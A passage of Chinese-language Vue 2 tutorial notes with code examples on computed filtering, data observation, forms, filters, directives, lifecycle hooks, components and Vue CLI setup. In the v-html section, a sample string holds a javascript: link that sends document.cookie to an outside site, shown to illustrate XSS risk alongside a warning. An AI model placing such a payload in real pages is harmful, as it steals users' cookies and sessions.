                  this.filPerons = this.persons.filter((p)=>{
                     return p.name.indexOf(val) !== -1
                  })
               }
            }
         }
      }) */
      //#endregion
      
      //用computed实现
      new Vue({
         el:'#root',
         data:{
            keyWord:'',
            persons:[
               {id:'001',name:'马冬梅',age:19,sex:'女'},
               {id:'002',name:'周冬雨',age:20,sex:'女'},
               {id:'003',name:'周杰伦',age:21,sex:'男'},
               {id:'004',name:'温兆伦',age:22,sex:'男'}
            ]
         },
         computed:{
            filPerons(){
               return this.persons.filter((p)=>{
                  return p.name.indexOf(this.keyWord) !== -1
               })
            }
         }
      }) 
   </script>
```

### 4.列表排序

```
<body>
   <!-- 准备好一个容器-->
   <div id="root">
      <h2>人员列表</h2>
      <input type="text" placeholder="请输入名字" v-model="keyWord">
      <button @click="sortType = 2">年龄升序</button>
      <button @click="sortType = 1">年龄降序</button>
      <button @click="sortType = 0">原顺序</button>
      <ul>
         <li v-for="(p,index) of filPerons" :key="p.id">
            {{p.name}}-{{p.age}}-{{p.sex}}
            <input type="text">
         </li>
      </ul>
   </div>

   <script type="text/javascript">
      Vue.config.productionTip = false
      
      new Vue({
         el:'#root',
         data:{
            keyWord:'',
            sortType:0, //0原顺序 1降序 2升序
            persons:[
               {id:'001',name:'马冬梅',age:30,sex:'女'},
               {id:'002',name:'周冬雨',age:31,sex:'女'},
               {id:'003',name:'周杰伦',age:18,sex:'男'},
               {id:'004',name:'温兆伦',age:19,sex:'男'}
            ]
         },
         computed:{
            filPerons(){
               const arr = this.persons.filter((p)=>{
                  return p.name.indexOf(this.keyWord) !== -1
               })
               //判断一下是否需要排序
               if(this.sortType){
                  arr.sort((p1,p2)=>{
                     return this.sortType === 1 ? p2.age-p1.age : p1.age-p2.age
                  })
               }
               return arr
            }
         }
      }) 

   </script>
```

## 十二、数据监测

Vue监视数据的原理：

vue会监视data中所有层次的数据。

1.如何监测对象中的数据？

​	通过setter实现监视，且要在new Vue时就传入要监测的数据。

- 对象中后追加的属性，Vue默认不做响应式处理
- 如需给后添加的属性做响应式，请使用如下API：
  - Vue.set(target，propertyName/index，value) 或 
  - vm.$set(target，propertyName/index，value)

2.如何监测数组中的数据？

通过包裹数组更新元素的方法实现，本质就是做了两件事：

- 调用原生对应的方法对数组进行更新。
- 重新解析模板，进而更新页面。

3.在Vue修改数组中的某个元素一定要用如下方法：

- 使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
- Vue.set() 或 vm.$set()

**特别注意：**Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！

```
    <div id="root">
      <h1>学生信息</h1>
      <button @click="student.age++">年龄+1岁</button> <br/>
      <button @click="addSex">添加性别属性，默认值：男</button> <br/>
      <button @click="student.sex = '未知' ">修改性别</button> <br/>
      <button @click="addFriend">在列表首位添加一个朋友</button> <br/>
      <button @click="updateFirstFriendName">修改第一个朋友的名字为：张三</button> <br/>
      <button @click="addHobby">添加一个爱好</button> <br/>
      <button @click="updateHobby">修改第一个爱好为：开车</button> <br/>
      <button @click="removeSmoke">过滤掉爱好中的抽烟</button> <br/>
      <h3>姓名：{{student.name}}</h3>
      <h3>年龄：{{student.age}}</h3>
      <h3 v-if="student.sex">性别：{{student.sex}}</h3>
      <h3>爱好：</h3>
      <ul>
         <li v-for="(h,index) in student.hobby" :key="index">
            {{h}}
         </li>
      </ul>
      <h3>朋友们：</h3>
      <ul>
         <li v-for="(f,index) in student.friends" :key="index">
            {{f.name}}--{{f.age}}
         </li>
      </ul>
   </div>
</body>

<script type="text/javascript">
   Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

   const vm = new Vue({
      el:'#root',
      data:{
         student:{
            name:'tom',
            age:18,
            hobby:['抽烟','喝酒','烫头'],
            friends:[
               {name:'jerry',age:35},
               {name:'tony',age:36}
            ]
         }
      },
      methods: {
         addSex(){
            // Vue.set(this.student,'sex','男')
            this.$set(this.student,'sex','男')
         },
         addFriend(){
            this.student.friends.unshift({name:'jack',age:70})
         },
         updateFirstFriendName(){
            this.student.friends[0].name = '张三'
         },
         addHobby(){
            this.student.hobby.push('学习')
         },
         updateHobby(){
            // this.student.hobby.splice(0,1,'开车')
            // Vue.set(this.student.hobby,0,'开车')
            this.$set(this.student.hobby,0,'开车')
         },
         removeSmoke(){
            this.student.hobby = this.student.hobby.filter((h)=>{
               return h !== '抽烟'
            })
         }
      }
   })
</script>
```

![数据监视](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/%E6%95%B0%E6%8D%AE%E7%9B%91%E8%A7%86.png)

![数据监视up](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/%E6%95%B0%E6%8D%AE%E7%9B%91%E8%A7%86up.png)

## 十三、收集表单数据

收集表单数据：

- 若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。
- 若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。
- 若：<input type="checkbox"/>
  - 没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
  - 配置input的value属性:
    - v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
    - v-model的初始值是数组，那么收集的的就是value组成的数组
- 备注：v-model的三个修饰符：
  - lazy：失去焦点再收集数据
  - number：输入字符串转为有效的数字
  - trim：输入首尾空格过滤

```
    <!-- 准备好一个容器-->
   <div id="root">
      <form @submit.prevent="demo">
         账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/>
         密码：<input type="password" v-model="userInfo.password"> <br/><br/>
         年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
         性别：
         男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
         女<input type="radio" name="sex" v-model="userInfo.sex" value="female"> <br/><br/>
         爱好：
         学习<input type="checkbox" v-model="userInfo.hobby" value="study">
         打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
         吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
         <br/><br/>
         所属校区
         <select v-model="userInfo.city">
            <option value="">请选择校区</option>
            <option value="beijing">北京</option>
            <option value="shanghai">上海</option>
            <option value="shenzhen">深圳</option>
            <option value="wuhan">武汉</option>
         </select>
         <br/><br/>
         其他信息：
         <textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
         <input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>
         <button>提交</button>
      </form>
   </div>
</body>

<script type="text/javascript">
   Vue.config.productionTip = false

   new Vue({
      el:'#root',
      data:{
         userInfo:{
            account:'',
            password:'',
            age:18,
            sex:'female',
            hobby:[],
            city:'beijing',
            other:'',
            agree:''
         }
      },
      methods: {
         demo(){
            console.log(JSON.stringify(this.userInfo))
         }
      }
   })
</script>
```

![收集表单数据](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/%E6%94%B6%E9%9B%86%E8%A1%A8%E5%8D%95%E6%95%B0%E6%8D%AE.png)

## 十四、过滤器

定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。
语法：
      1.注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}
      2.使用过滤器：{{ xxx | 过滤器名}}  或  v-bind:属性 = "xxx | 过滤器名"
备注：
      1.过滤器也可以接收额外参数、多个过滤器也可以串联
      2.并没有改变原本的数据, 是产生新的对应的数据

```
    <!-- 准备好一个容器-->
   <div id="root">
      <h2>显示格式化后的时间</h2>
      <!-- 计算属性实现 -->
      <h3>现在是：{{fmtTime}}</h3>
      <!-- methods实现 -->
      <h3>现在是：{{getFmtTime()}}</h3>
      <!-- 过滤器实现 -->
      <h3>现在是：{{time | timeFormater}}</h3>
      <!-- 过滤器实现（传参） -->
      <h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
      <h3 :x="msg | mySlice">vue</h3>
   </div>

   <div id="root2">
      <h2>{{msg | mySlice}}</h2>
   </div>
</body>

<script type="text/javascript">
   Vue.config.productionTip = false
   //全局过滤器
   Vue.filter('mySlice',function(value){
      return value.slice(0,4)
   })

   new Vue({
      el:'#root',
      data:{
         time:1621561377603, //时间戳
         msg:'你好，vue'
      },
      computed: {
         fmtTime(){
            return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
         }
      },
      methods: {
         getFmtTime(){
            return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
         }
      },
      //局部过滤器
      filters:{
         timeFormater(value,str='YYYY年MM月DD日 HH:mm:ss'){
            // console.log('@',value)
            return dayjs(value).format(str)
         }
      }
   })

   new Vue({
      el:'#root2',
      data:{
         msg:'hello,vue!'
      }
   })
</script>
```

![过滤器](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/%E8%BF%87%E6%BB%A4%E5%99%A8.png)

## 十五、内置指令

- v-text : 更新元素的 textContent 
- v-html : 更新元素的 innerHTML 
- v-if : 如果为 true, 当前标签才会输出到页面 
- v-else: 如果为 false, 当前标签才会输出到页面 
- v-show : 通过控制 display 样式来控制显示/隐藏 
- v-for : 遍历数组/对象 
- v-on : 绑定事件监听, 一般简写为@ 
- v-bind : 绑定解析表达式, 可以省略 v-bind 
- v-model : 双向数据绑定 
- v-cloak : 防止闪现, 与 css 配合: [v-cloak] { display: none }

### 1.v-text

v-text指令：

- 作用：向其所在的节点中渲染文本内容。
- 与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。

```
    <!-- 准备好一个容器-->
   <div id="root">
      <div>你好，{{name}}</div>
      <div v-text="name">你好</div>
      <div v-text="str"></div>
   </div>
</body>

<script type="text/javascript">
   Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

   new Vue({
      el:'#root',
      data:{
         name:'vue',
         str:'<h3>你好啊！</h3>'
      }
   })
</script>
```

![v-text](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/v-text.png)

### 2.v-html

- 作用：向指定节点中渲染包含html结构的内容。
- 与插值语法的区别：
  - v-html会替换掉节点中所有的内容，{{xx}}则不会。
  - v-html可以识别html结构。
- 严重注意：v-html有安全性问题！！！！
  - 在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
  - 一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！

```
    <!-- 准备好一个容器-->
   <div id="root">
      <div>你好，{{name}}</div>
      <div v-html="str"></div>
      <div v-html="str2"></div>
   </div>
</body>

<script type="text/javascript">
   Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

   new Vue({
      el:'#root',
      data:{
         name:'vue',
         str:'<h3>你好啊！</h3>',
         str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
      }
   })
</script>
```

![v-html](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/v-html.png)

### 3.v-cloak

- 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
- 使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。

```
<style>
   [v-cloak]{
      display:none;
   }
</style>
```

```
    <!-- 准备好一个容器-->
   <div id="root">
      <h2 v-cloak>{{name}}</h2>
   </div>
   <script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
</body>

<script type="text/javascript">
   console.log(1)
   Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
   
   new Vue({
      el:'#root',
      data:{
         name:'vue'
      }
   })
</script>
```

效果为该处，在引用资源加载出来之前不会出现name值，vue实例创建完成后删掉 v-cloak属性，name值则在页面显示出来

### 4.v-once

- v-once所在节点在初次动态渲染后，就视为静态内容了。
- 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。

```
    <!-- 准备好一个容器-->
   <div id="root">
      <h2 v-once>初始化的n值是:{{n}}</h2>
      <h2>当前的n值是:{{n}}</h2>
      <button @click="n++">点我n+1</button>
   </div>
</body>

<script type="text/javascript">
   Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
   
   new Vue({
      el:'#root',
      data:{
         n:1
      }
   })
</script>
```

![v-once1](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/v-once1.png)

![v-once2](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/v-once2.png)

### 5.v-pre

- 跳过其所在节点的编译过程。
- 可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。

```
    <div id="root">
      <h2 v-pre>Vue其实很简单</h2>
      <h2 >当前的n值是:{{n}}</h2>
      <button @click="n++">点我n+1</button>
   </div>
</body>

<script type="text/javascript">
   Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

   new Vue({
      el:'#root',
      data:{
         n:1
      }
   })
</script>
```

![v-pre](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/v-pre.png)

## 十六、自定义指令

1.定义语法：

- 局部指令：

  ```
  new Vue({                                             new Vue({
     directives:{指令名:配置对象}   或         directives{指令名:回调函数}
  })                       
  ```

- 全局指令：

  ```
  Vue.directive(指令名,配置对象) 或   Vue.directive(指令名,回调函数)
  ```

2.配置对象中常用的3个回调：

- bind：指令与元素成功绑定时调用。
- inserted：指令所在元素被插入页面时调用。
- update：指令所在模板结构被重新解析时调用。

3.备注：

- 指令定义时不加v-，但使用时要加v-；
- 指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。



例：

需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。
需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。

```
    <!-- 准备好一个容器-->
   <div id="root">
      <h2>{{name}}</h2>
      <h2>当前的n值是：<span v-text="n"></span> </h2>
      <!-- <h2>放大10倍后的n值是：<span v-big-number="n"></span> </h2> -->
      <h2>放大10倍后的n值是：<span v-big="n"></span> </h2>
      <button @click="n++">点我n+1</button>
      <hr/>
      <input type="text" v-fbind:value="n">
   </div>
</body>

<script type="text/javascript">
   Vue.config.productionTip = false

   //定义全局指令
   /* Vue.directive('fbind',{
      //指令与元素成功绑定时（一上来）
      bind(element,binding){
         element.value = binding.value
      },
      //指令所在元素被插入页面时
      inserted(element,binding){
         element.focus()
      },
      //指令所在的模板被重新解析时
      update(element,binding){
         element.value = binding.value
      }
   }) */

   new Vue({
      el:'#root',
      data:{
         name:'vue',
         n:1
      },
      directives:{
         //big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
         /* 'big-number'(element,binding){
            // console.log('big')
            element.innerText = binding.value * 10
         }, */
         big(element,binding){
            console.log('big',this) //注意此处的this是window
            // console.log('big')
            element.innerText = binding.value * 10
         },
         fbind:{
            //指令与元素成功绑定时（一上来）
            bind(element,binding){
               element.value = binding.value
            },
            //指令所在元素被插入页面时
            inserted(element,binding){
               element.focus()
            },
            //指令所在的模板被重新解析时
            update(element,binding){
               element.value = binding.value
            }
         }
      }
   })

</script>
```

![自定义指令1](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A41.png)

![自定义指令2](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A42.png)

## 十七、生命周期

- 又名：生命周期回调函数、生命周期函数、生命周期钩子。
- 是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数。
- 生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。
- 生命周期函数中的this指向是vm 或 组件实例对象。



初始化显示 

- beforeCreate() 
- created() 
- beforeMount() 
- mounted() 

 更新状态: this.xxx = value 

- beforeUpdate() 
- updated()

销毁 vue 实例: vm.$destory() 

- beforeDestory() 
- destoryed()

![生命周期](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.png)

```
<body>
   <!-- 准备好一个容器-->
   <div id="root" :x="n">
      <h2 v-text="n"></h2>
      <h2>当前的n值是：{{n}}</h2>
      <button @click="add">点我n+1</button>
      <button @click="bye">点我销毁vm</button>
   </div>
</body>

<script type="text/javascript">
   Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

   new Vue({
      el:'#root',
      // template:`
      //     <div>
      //        <h2>当前的n值是：{{n}}</h2>
      //        <button @click="add">点我n+1</button>
      //     </div>
      // `,
      data:{
         n:1
      },
      methods: {
         add(){
            console.log('add')
            this.n++
         },
         bye(){
            console.log('bye')
            this.$destroy()
         }
      },
      watch:{
         n(){
            console.log('n变了')
         }
      },
      beforeCreate() {
         console.log('beforeCreate')
      },
      created() {
         console.log('created')
      },
      beforeMount() {
         console.log('beforeMount')
      },
      mounted() {
         console.log('mounted')
      },
      beforeUpdate() {
         console.log('beforeUpdate')
      },
      updated() {
         console.log('updated')
      },
      beforeDestroy() {
         console.log('beforeDestroy')
      },
      destroyed() {
         console.log('destroyed')
      },
   })
</script>
```

![生命周期1](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F1.png)

![生命周期2](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F2.png)

![生命周期3](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F3.png)

### 总结：

常用的生命周期钩子：

- mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。
- beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。

关于销毁Vue实例

- 销毁后借助Vue开发者工具看不到任何信息。
- 销毁后自定义事件会失效，但原生DOM事件依然有效。
- 一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。

```
    <!-- 准备好一个容器-->
   <div id="root">
      <h2 :style="{opacity}">欢迎学习Vue</h2>
      <button @click="opacity = 1">透明度设置为1</button>
      <button @click="stop">点我停止变换</button>
   </div>
</body>

<script type="text/javascript">
   Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
      el:'#root',
      data:{
         opacity:1
      },
      methods: {
         stop(){
            this.$destroy()
         }
      },
      //Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted
      mounted(){
         console.log('mounted',this)
         this.timer = setInterval(() => {
            console.log('setInterval')
            this.opacity -= 0.01
            if(this.opacity <= 0) this.opacity = 1
         },16)
      },
      beforeDestroy() {
         clearInterval(this.timer)
         console.log('vm即将驾鹤西游了')
      },
   })

</script>
```

![destroy](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/destroy.png)

## 十八、模块与组件、模块化与组件化

### 1.模块 

- 理解: 向外提供特定功能的 js 程序, 一般就是一个 js 文件 
- 为什么: js 文件很多很复杂 
- 作用: 复用 js, 简化 js 的编写, 提高 js 运行效率 

### 2.组件 

- 理解: 用来实现局部(特定)功能效果的代码集合(html/css/js/image…..) 
- 为什么: 一个界面的功能很复杂
- 作用: 复用编码, 简化项目编码, 提高运行效率 

### 3.模块化 

- 当应用中的 js 都以模块来编写的, 那这个应用就是一个模块化的应用。 

### 4.组件化 

- 当应用中的功能都是多组件的方式来编写的, 那这个应用就是一个组件化的应用。

### 5.非单文件组件

#### 基本使用

Vue中使用组件的三大步骤：

- 定义组件(创建组件)
- 注册组件
- 使用组件(写组件标签)

如何定义一个组件？

- 使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；
- 区别如下：
  - el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。
  - data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。
- 备注：使用template可以配置组件结构。

如何注册组件？

- 局部注册：靠new Vue的时候传入components选项
- 全局注册：靠Vue.component('组件名',组件)

编写组件标签：
            <school></school>

```
    <!-- 准备好一个容器-->
   <div id="root">
      <hello></hello>
      <hr>
      <h1>{{msg}}</h1>
      <hr>
      <!-- 第三步：编写组件标签 -->
      <school></school>
      <hr>
      <!-- 第三步：编写组件标签 -->
      <student></student>
   </div>

   <div id="root2">
      <hello></hello>
   </div>
</body>

<script type="text/javascript">
   Vue.config.productionTip = false

   //第一步：创建school组件
   const school = Vue.extend({
      template:`
         <div class="demo">
            <h2>学校名称：{{schoolName}}</h2>
            <h2>学校地址：{{address}}</h2>
            <button @click="showName">点我提示学校名</button>
         </div>
      `,
      // el:'#root', //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。
      data(){
         return {
            schoolName:'vue',
            address:'北京昌平'
         }
      },
      methods: {
         showName(){
            alert(this.schoolName)
         }
      },
   })

   //第一步：创建student组件
   const student = Vue.extend({
      template:`
         <div>
            <h2>学生姓名：{{studentName}}</h2>
            <h2>学生年龄：{{age}}</h2>
         </div>
      `,
      data(){
         return {
            studentName:'张三',
            age:18
         }
      }
   })

   //第一步：创建hello组件
   const hello = Vue.extend({
      template:`
         <div>
            <h2>你好啊！{{name}}</h2>
         </div>
      `,
      data(){
         return {
            name:'Tom'
         }
      }
   })

   //第二步：全局注册组件
   Vue.component('hello',hello)

   //创建vm
   new Vue({
      el:'#root',
      data:{
         msg:'你好啊！'
      },
      //第二步：注册组件（局部注册）
      components:{
         school,
         student
      }
   })

   new Vue({
      el:'#root2',
   })
</script>
```

![非单文件组件](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/%E9%9D%9E%E5%8D%95%E6%96%87%E4%BB%B6%E7%BB%84%E4%BB%B6.png)

#### 注意点

- 关于组件名:
  -  一个单词组成：
    - 第一种写法(首字母小写)：school
    - 第二种写法(首字母大写)：School
  - 多个单词组成：
    - 第一种写法(kebab-case命名)：my-school
    - 第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)
  - 备注：
    - 组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。
    - 可以使用name配置项指定组件在开发者工具中呈现的名字。

- 关于组件标签:
  - 第一种写法：<school></school>
  - 第二种写法：<school/>
  - 备注：不用使用脚手架时，<school/>会导致后续组件不能渲染。

- 一个简写方式：

  const school = Vue.extend(options) 可简写为：const school = options

#### 组件的嵌套

```
<body>
   <!-- 准备好一个容器-->
   <div id="root">

   </div>
</body>

<script type="text/javascript">
   Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

   //定义student组件
   const student = Vue.extend({
      name:'student',
      template:`
         <div>
            <h2>学生姓名：{{name}}</h2>
            <h2>学生年龄：{{age}}</h2>
         </div>
      `,
      data(){
         return {
            name:'vue',
            age:18
         }
      }
   })

   //定义school组件
   const school = Vue.extend({
      name:'school',
      template:`
         <div>
            <h2>学校名称：{{name}}</h2>
            <h2>学校地址：{{address}}</h2>
            <student></student>
         </div>
      `,
      data(){
         return {
            name:'vue',
            address:'北京'
         }
      },
      //注册组件（局部）
      components:{
         student
      }
   })

   //定义hello组件
   const hello = Vue.extend({
      template:`<h1>{{msg}}</h1>`,
      data(){
         return {
            msg:'欢迎来到vue学习！'
         }
      }
   })

   //定义app组件
   const app = Vue.extend({
      template:`
         <div>
            <hello></hello>
            <school></school>
         </div>
      `,
      components:{
         school,
         hello
      }
   })

   //创建vm
   new Vue({
      template:'<app></app>',
      el:'#root',
      //注册组件（局部）
      components:{app}
   })
</script>
```

![组件的嵌套](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/%E7%BB%84%E4%BB%B6%E7%9A%84%E5%B5%8C%E5%A5%97.png)

#### VueComponent

- school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。

- 我们只需要写<school/>或<school></school>，Vue解析时会帮我们创建school组件的实例对象，即Vue帮我们执行的：new VueComponent(options)。

- 特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！

- 关于this指向：

  组件配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。

  new Vue(options)配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。

- VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。Vue的实例对象，可以简称vm。

```
    <!-- 准备好一个容器-->
   <div id="root">
      <school></school>
      <hello></hello>
   </div>
</body>

<script type="text/javascript">
   Vue.config.productionTip = false

   //定义school组件
   const school = Vue.extend({
      name:'school',
      template:`
         <div>
            <h2>学校名称：{{name}}</h2>
            <h2>学校地址：{{address}}</h2>
            <button @click="showName">点我提示学校名</button>
         </div>
      `,
      data(){
         return {
            name:'vue',
            address:'北京'
         }
      },
      methods: {
         showName(){
            console.log('showName',this)
         }
      },
   })

   const test = Vue.extend({
      template:`<span>vue</span>`
   })

   //定义hello组件
   const hello = Vue.extend({
      template:`
         <div>
            <h2>{{msg}}</h2>
            <test></test>
         </div>
      `,
      data(){
         return {
            msg:'你好啊！'
         }
      },
      components:{test}
   })


   // console.log('@',school)
   // console.log('#',hello)

   //创建vm
   const vm = new Vue({
      el:'#root',
      components:{school,hello}
   })
</script>
```

![VueComponent](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/VueComponent.png)

#### 一个重要的内置关系

- 一个重要的内置关系：VueComponent.prototype.__proto__ === Vue.prototype
- 为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。

![Vue与VueComponent](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/Vue%E4%B8%8EVueComponent.png)

### 6.单文件组件

#### . 一个.vue 文件的组成(3 个部分)

**1.模板页面**

```
<template> 页面模板 </template>
```

**2. JS 模块对象**

```
<script> 
   export default { 
      data() {return {}},
      methods: {}, 
      computed: {}, 
      components: {} 
   }
</script>
```

**3. 样式**

```
<style> 样式定义 </style>
```

#### 基本使用

1. 引入组件 
2. 映射成标签 
3. 使用组件标签



文件：School.vue

```
<template>
   <div class="demo">
      <h2>学校名称：{{name}}</h2>
      <h2>学校地址：{{address}}</h2>
      <button @click="showName">点我提示学校名</button>
   </div>
</template>

<script>
    export default {
      name:'School',
      data(){
         return {
            name:'vue',
            address:'北京昌平'
         }
      },
      methods: {
         showName(){
            alert(this.name)
         }
      },
   }
</script>

<style>
   .demo{
      background-color: orange;
   }
</style>
```



文件：Student..vue

```
<template>
   <div>
      <h2>学生姓名：{{name}}</h2>
      <h2>学生年龄：{{age}}</h2>
   </div>
</template>

<script>
    export default {
      name:'Student',
      data(){
         return {
            name:'张三',
            age:18
         }
      }
   }
</script>
```



文件：App.vue

```
<template>
   <div>
      <School></School>
      <Student></Student>
   </div>
</template>

<script>
   //引入组件
   import School from './School.vue'
   import Student from './Student.vue'

   export default {
      name:'App',
      components:{
         School,
         Student
      }
   }
</script>
```

## 十九、使用vue脚手架

### 1.初始化脚手架

#### 说明

- Vue 脚手架是 Vue 官方提供的标准化开发工具（开发平台）。 
- 最新的版本是 4.x。 
- 文档: https://cli.vuejs.org/zh/。 

#### 具体步骤

第一步（仅第一次执行）：全局安装@vue/cli。 

npm install -g @vue/cli 

第二步：**切换到你要创建项目的目录**，然后使用命令创建项目 

vue create xxxx 

第三步：启动项目 

npm run serve

备注： 

1. 如出现下载缓慢请配置 npm 淘宝镜像：npm config set registry 

https://registry.npm.taobao.org

2. Vue 脚手架隐藏了所有 webpack 相关的配置，若想查看具体的 webpack 配置， 

请执行：vue inspect > output.js

#### 目标项目结构

**├── node_modules** 

**├── public** 

**│ ├── favicon.ico: 页签图标** 

**│ └──** **index.html: 主页面** 

**├── src** 

**│ ├── assets: 存放静态资源** 

**│ │ └── logo.png** 

**│ │──** **component: 存放组件** 

**│ │ └── HelloWorld.vue** 

**│ │──** **App.vue: 汇总所有组件** 

**│ │──** **main.js: 入口文件** 

**├── .gitignore: git 版本管制忽略的配置** 

**├── babel.config.js: babel 的配置文件** 

**├── package.json: 应用包配置文件** 

**├── README.md: 应用描述文件** 

**├── package-lock.json：包版本控制文件**



index.html:

```
<!DOCTYPE html>
<html lang="">
  <head>
    <meta charset="utf-8">
      <!-- 针对IE浏览器的一个特殊配置，含义是让IE浏览器以最高的渲染级别渲染页面 -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <!-- 开启移动端的理想视口 -->
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
      <!-- 配置页签图标 -->
    <link rel="icon" href="<%= BASE_URL %>favicon.ico">
      <!-- 引入第三方样式 -->
      <link rel="stylesheet" href="<%= BASE_URL %>css/bootstrap.css">
      <!-- 配置网页标题 -->
    <title>硅谷系统</title>
  </head>
  <body>
      <!-- 当浏览器不支持js时noscript中的元素就会被渲染 -->
    <noscript>
      <strong>We're sorry but <%= htmlWebpackPlugin.options.title %> doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
    </noscript>
      <!-- 容器 -->
    <div id="app"></div>
    <!-- built files will be auto injected -->
  </body>
</html>
```

### 2.render函数

关于不同版本的Vue：

- vue.js与vue.runtime.xxx.js的区别：
  - vue.js是完整版的Vue，包含：核心功能+模板解析器。
  - vue.runtime.xxx.js是运行版的Vue，只包含：核心功能；没有模板解析器。
- 因为vue.runtime.xxx.js没有模板解析器，所以不能使用template配置项，需要使用render函数接收到的createElement函数去指定具体内容。

main.js文件：

```
//引入Vue
import Vue from 'vue'
//引入App组件，它是所有组件的父组件
import App from './App.vue'
//关闭vue的生产提示
Vue.config.productionTip = false
```

```
//创建Vue实例对象---vm
new Vue({
   el:'#app',
   //render函数完成了这个功能：将App组件放入容器中
  render: h => h(App),

   // render:q=> q('h1','你好啊')
    // render(createElement){
    //     return createElement('h1', '你好啊')
    // }

    // 引入的vue文件不能解析template配置项，需要引入带有模板解析器的vue
   // template:`<h1>你好啊</h1>`,
   // components:{App},
})
```

### 3.ref与props

#### ref

**1. 作用：**被用来给元素或子组件注册引用信息（id的替代者），或者说用于给节点打标识

应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象（vc）

**2. 使用方式：**

- 打标识：```<h1 ref="xxx">.....</h1>``` 或 ```<School ref="xxx"></School>```
